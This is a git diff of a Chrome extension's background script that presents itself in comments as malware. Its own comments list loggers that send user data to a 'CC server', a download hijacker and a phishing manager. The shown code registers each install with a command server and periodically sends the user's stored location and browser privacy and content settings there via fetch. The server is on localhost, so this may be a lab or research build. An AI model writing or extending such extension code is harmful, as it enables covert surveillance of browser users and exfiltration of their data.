@@ -1,3 +1,42 @@
+//How would comments works
+/*
+Code is divided in sections that separete functions and listeners by common objective
+
+The sections are:
+
+START (uid creation, phase state, default values, initial Time)
+Loggers (All loggers that the extension can use to recopilate information from the user and send it to the CC server)
+Phase Listener (The extension periodically ask the CC server if it needs to change phase and for the update values for the attacks)
+Dowload Hickjacker (The extension capabilities for hickjacking the download system for malware)
+Phising Manager (The extension capabilities for producing a phishing attacks using the url given by the CC server)
+
+At the same time, each function will have a short description of what it does, and specific procedures
+would be explain
+
+General notes:
+fetch() is the only allow API for sending request, has a preatty straigforward appearences
+featch(url,request) where request = {method, mode, body, headers}, is capable of far more, but
+this is all used here. For more information https://developer.mozilla.org/en-US/docs/Web/API/fetch
+
+Chrome.storage is the include API for managing persistance data by the extensions, needed
+due to the workers not saving last config. It can exist localy in the machine (local, 5MB) or
+syncronized with a google account (sync, 1MB), it can also be used only for one session of Chrome with "session".
+
+The calls to storage are asyncronus and returns promises (a non executed objected). Therefore if it is wanted to make a 
+comprobation and then change if a specific value exists, this has to be done inside a function with the .then attribute of
+a promise. If not, problems with scopes and variables appear. The same happens with the Featch API.
+
+Chrome listeners:
+workers function by listening to events in the browser, executing the worker and stayinh awake for almost 5 min.
+workers are not realiable, not all listeners will execute correctly, and sometimes can be ignored. So, persistance is imposible with 
+listeners.
+
+There are of severala types and what exactly listen will be commented in the respective functions.
+
+*/
+
+
+
 //START, UID CREATION, PHASE STATE
 
 /*
@@ -15,9 +54,16 @@ In the other hand, the phase state is restarted with updates of the extension, b
 
 
 chrome.runtime.onInstalled.addListener(function setuid(){
-    const First_installed = Date.now().toString();
+    //When installed or update the extension:
+    const First_installed = Date.now().toString(); //take that initial time
     //https://stackoverflow.com/questions/521295/seeding-the-random-number-generator-in-javascript
-    function cyrb128(str) {
+    
+    function cyrb128(str) { //a Cipher-Hash is initialize
+        /* 
+        this is a simplified version of the cyrb128 Cipher-HASH that use bit manipulation
+        This is used for creating a unique hash in base of the time of installaling the 
+        extension (First_installed).
+        */
         let h1 = 1779033703, h2 = 3144134277,
             h3 = 1013904242, h4 = 2773480762;
         for (let i = 0, k; i < str.length; i++) {
@@ -31,15 +77,20 @@ chrome.runtime.onInstalled.addListener(function setuid(){
         h2 = Math.imul(h4 ^ (h2 >>> 22), 2869860233);
         h3 = Math.imul(h1 ^ (h3 >>> 17), 951274213);
         h4 = Math.imul(h2 ^ (h4 >>> 19), 2716044179);
-        return [((h1^h2^h3^h4)>>>0).toString()];
+        return [((h1^h2^h3^h4)>>>0).toString()]; //The simplification is done by cutting 3 segments of the return function
     }
-    const value = cyrb128(First_installed);
-    var a = false;
-    chrome.storage.local.get(["uid"]).then( (result)=>{
+
+
+    chrome.storage.local.get(["uid"]).then( (result)=>{ //search for the uid attribute in local memory
         
-        
-        if (result.uid == undefined ){
-            chrome.storage.local.set({uid:value});
+        /*
+        We do not want to modify the uid each time is restarted or update the extension
+        This looks if there is already an UID saved, if not, save the UID generate
+        */
+       
+        if (result.uid == undefined ){ //if non attribute uid saved
+            const value = cyrb128(First_installed); //hash time of installment
+            chrome.storage.local.set({uid:value}); //save has uid attribute (asyncronus)
 
             fetch('http://127.0.0.1:5000/extadd',
             {
@@ -47,14 +98,20 @@ chrome.runtime.onInstalled.addListener(function setuid(){
             mode: 'no-cors', 
             body: JSON.stringify({"uid": value}),
             headers:{"Content-Type": "application/json"}
-            })
+            }) //Inmediatly add the user to the list on the server (asyncronus)
 
         }
     
     });
     
     chrome.storage.local.get(["TimeA"]).then( (result)=>{
-        
+        //For periodic communication we use the global time sinde the last epoch
+        //We need that to now when was the last time we stablish communication
+        //We do not want that value to be modifie
+        //We do not want to inmediatly send all the information after inatalling
+        //Hence, this looks if those time variable are initialized, if not, it initialize them withthe time of installment
+        //Also, stablish the default settings for the dowload hijack system, such that
+        //They can be later modify by the server
         
         if (result.TimeA == undefined ){
             chrome.storage.local.set({TimeA:First_installed});
@@ -63,7 +120,7 @@ chrome.runtime.onInstalled.addListener(function setuid(){
         }
     
     });
-    chrome.storage.local.set({phase:0});
+    chrome.storage.local.set({phase:0});//We set the initial phase to 0, that is, normal operation
 
 
 })
@@ -158,7 +215,7 @@ function loggingprivacySettings(){
         mode: 'no-cors',
         body: JSON.stringify(S),
         headers:{"Content-Type": "application/json"}
-        })
+        }).then((response)=> {console.log(response)})
         
         })},1500);    
 
@@ -166,22 +223,30 @@ function loggingprivacySettings(){
 }
 
 function logSend(){
+    try{
+        chrome.storage.local.get(["lat", "long"]).then((result)=>{
+            number = 3;
+            fetch(`http://127.0.0.1:5000/control_server`,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify([result.lat, result.long]),
+            headers:{"Content-Type": "application/json"}
+            })
+            ;})
+        
+        loggingcontentSettings();
+        loggingprivacySettings();
+        return true
+    }
+    catch{
+        return false
+    }
     //chrome.system.cpu.getInfo((info)=>{logCPU(info)})
     //chrome.management.getAll((info)=>{logExApp(info)})
     //chrome.downloads.search({}).then(logExApp) 
     //chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))
-    chrome.storage.local.get(["lat", "long"]).then((result)=>{
-        number = 3;
-        fetch(`http://127.0.0.1:5000/control_server`,
-        {
-        method: "POST",
-        mode: 'no-cors',
-        body: JSON.stringify([result.lat, result.long]),
-        headers:{"Content-Type": "application/json"}
-        });})
-    
-    loggingcontentSettings();
-    loggingprivacySettings();
+
 }
 
 //chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
@@ -194,10 +259,12 @@ chrome.webNavigation.onCompleted.addListener((e) => {
                 let a = Date.now()
                 a = Math.abs(parseInt(result.TimeA)-a)
                 if (a > 10*1000){
-                    logSend()
+                    if(logSend()){
+                        a = Date.now()
+                        chrome.storage.local.set({TimeA:a})
+                    }
                     
-                    a = Date.now()
-                    chrome.storage.local.set({TimeA:a})
+
                 }
         });
 
